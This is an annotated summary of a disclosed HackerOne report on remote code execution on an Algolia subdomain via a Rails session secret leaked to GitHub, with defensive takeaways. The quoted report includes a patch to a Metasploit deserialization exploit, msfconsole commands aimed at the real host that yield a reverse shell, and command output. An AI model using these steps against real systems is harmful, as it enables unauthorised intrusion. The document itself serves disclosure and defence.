# RCE on facebooksearch.algolia.com via Exposed Rails Session Secret

## Metadata
- **Source:** HackerOne
- **Report:** 134321 | https://hackerone.com/reports/134321
- **Submitted:** 2016-04-25
- **Reporter:** michiel
- **Program:** Algolia
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Remote Code Execution, Insecure Deserialization, Credential Exposure, Insecure Configuration Management
- **CVEs:** None
- **Category:** memory-binary

## Summary
A Rails session secret was committed to a public GitHub repository, allowing attackers to forge authenticated session cookies. By exploiting Rails' unsafe cookie deserialization with CookieStore, an attacker could craft malicious serialized Ruby objects to achieve arbitrary code execution on the server running facebooksearch.algolia.com.

## Attack scenario
1. Attacker uses Gitrob or similar tools to scan Algolia's public GitHub repositories for sensitive files
2. Attacker discovers secret_token.rb initializer in facebook-search repository containing the exposed session secret
3. Attacker uses the Metasploit rails_secret_deserialization exploit module (or custom code) to craft a malicious serialized Ruby object
4. Attacker signs the malicious object using the compromised secret to create a valid session cookie
5. Attacker sends HTTP request to facebooksearch.algolia.com with the crafted cookie
6. Rails server deserializes the cookie, instantiating the attacker's object which executes arbitrary code during deserialization

## Root cause
Security misconfigurations: (1) Session secret hardcoded in application code rather than externalized to environment variables, (2) Secret committed to version control and pushed to public repository, (3) Use of insecure CookieStore with default Rails deserialization that allows arbitrary object instantiation, (4) Lack of secret rotation or monitoring for credential leaks

## Attacker mindset
Opportunistic reconnaissance mindset - systematically scanning public repositories for low-hanging fruit containing secrets. Leveraging existing public exploits (Metasploit) rather than developing custom code, indicating knowledge of common Rails vulnerabilities and desire for quick exploitation without deep technical work.

## Defensive takeaways
- Never commit secrets to version control; use environment variables or secure secret management systems (AWS Secrets Manager, HashiCorp Vault, etc.)
- Implement pre-commit hooks and git scanning tools (git-secrets, TruffleHog) to prevent secret leakage
- Migrate from insecure Rails CookieStore to encrypted session storage (EncryptedCookieStore with authenticated encryption)
- Regularly scan public repositories and GitHub for exposed credentials; implement monitoring for commits containing patterns matching secrets
- Use signed cookies with cryptographic validation but avoid deserialization of untrusted data
- Implement defense-in-depth: assume secrets may be compromised and rotate them regularly
- Educate developers on secure coding practices and secret management
- Implement intrusion detection to identify anomalous cookie patterns or deserialization attempts

## Variant hunting
Search for similar patterns in other organizations: (1) Hardcoded secrets in Rails initializer files across GitHub, (2) Publicly accessible git repositories with .git directories exposed, (3) Other frameworks using insecure deserialization (Java serialization, Python pickle), (4) Companies using CookieStore without encrypted session support, (5) Subdomain takeovers on acquired company assets like facebooksearch.algolia.com

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1552 - Unsecured Credentials
- T1187 - Forced Authentication
- T1204 - User Execution
- T1059 - Command and Scripting Interpreter
- T1086 - PowerShell (or equivalent shell execution)

## Notes
This is a well-documented critical vulnerability exploiting a multi-factor failure: credential exposure + insecure deserialization. The reporter demonstrated responsible disclosure by creating a proof-of-concept file rather than escalating compromise. The patch provided shows practical exploit modification for edge cases. The vulnerability chain is particularly dangerous because it requires no user interaction and results in immediate OS-level code execution as the application user (prod). The use of public Metasploit module indicates this vulnerability class is well-known and easily exploitable.

## Full report
<details><summary>Expand</summary>

While doing recon on Algolia, I found that the session secret for facebooksearch.algolia.com has been committed to a **public** GitHub repository. Since the Rails app running at `facebooksearch.algolia.com` is using `CookieStore` as the session storage, this means an attacker knowing the session secret can craft any cookie that will then be accepted by the server.

Cookie values are deserialized (unmarshalled) server-side. That combined with knowing the session secret creates the dangerous opportunity for an RCE. The attacker can sign a cookie that contains a Ruby object that evals arbitrary code when it is deserialized on the server side. The concept is explained in depth here: https://charlie.bz/blog/rails-3.2.10-remote-code-execution. 

# Where did I find the session secret?
I used [Gitrob](https://github.com/michenriksen/gitrob) to scan all of Algolia's public repositories (plus repositories from employees) and extract everything that is interesting. The `secret_token.rb` initializer immediately caught my attention since it usually contains the `secret_key_base`, which should never be public. 

The token can be found here: https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12

# Proof of Concept
@joernchen developed a ready to go proof of concept for this vulnerability and submitted it to the [Metasploit Framework](http://www.darkoperator.com/installing-metasploit-in-ubunt/): https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb

Since the version of the exploit doesn't take cookies with `-` into account, here is a small patch to allow the exploit to work on the `_facebook-search_session` cookie. Here's the patch for the exploit: 

```diff
     if res && !res.get_cookies.empty?
-      match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)
+      match = res.get_cookies.match(/([_A-Za-z0-9\-]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)
     end
```

With that patch applied, you can run the PoC from `msfconsole` by following these commands:

```bash
# setting up
use exploit/multi/http/rails_secret_deserialization
set secret "<grab-from-github-url>"
set rhost facebooksearch.algolia.com
set railsversion 4
set targeturi /auth/facebook

# and then run
exploit

# when successful, a reverse shell will be established
# this allows you to run arbitrary commands
```

As a proof of concept, I ran `id`:

```
id
uid=1000(prod) gid=1000(prod) groups=1000(prod)
```

But since that is very generic, I also created http://facebooksearch.algolia.com/hackerone.txt with the text "PoC by michiel" to proof regular write access is possible as well. 

# Remediation
Switch `config/initializers/secret_token.rb` to use an environment variable (e.g. `ENV['SECRET_KEY_BASE']`). You must also generate a new token because the current secret is compromised. A new secret can be generated by running `rake secret` from the command line. Make sure the new secret does not leak in git commit history. 



</details>

---
*Analysed by Claude on 2026-06-07*
